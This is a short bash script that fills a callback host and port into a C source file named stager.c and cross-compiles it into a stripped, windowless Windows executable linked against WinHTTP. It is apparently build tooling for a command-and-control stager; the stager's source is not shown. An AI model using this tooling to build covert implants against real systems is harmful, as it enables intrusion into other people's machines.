#!/bin/bash
# Standalone stager build script
# Usage: ./build.sh [host] [port]
# Example: ./build.sh 192.168.1.100 8443

set -e

HOST="${1:-127.0.0.1}"
PORT="${2:-8443}"

sed "s/HOST_PLACEHOLDER/$HOST/g; s/PORT_PLACEHOLDER/$PORT/g" stager.c > stager_build.c

x86_64-w64-mingw32-gcc stager_build.c -o stager.exe \
    -Os \
    -s \
    -fno-ident \
    -ffunction-sections \
    -fdata-sections \
    -Wl,--gc-sections \
    -lwinhttp \
    -lkernel32 \
    -mwindows

rm -f stager_build.c

echo "Built stager.exe for ${HOST}:${PORT}"
ls -la stager.exe

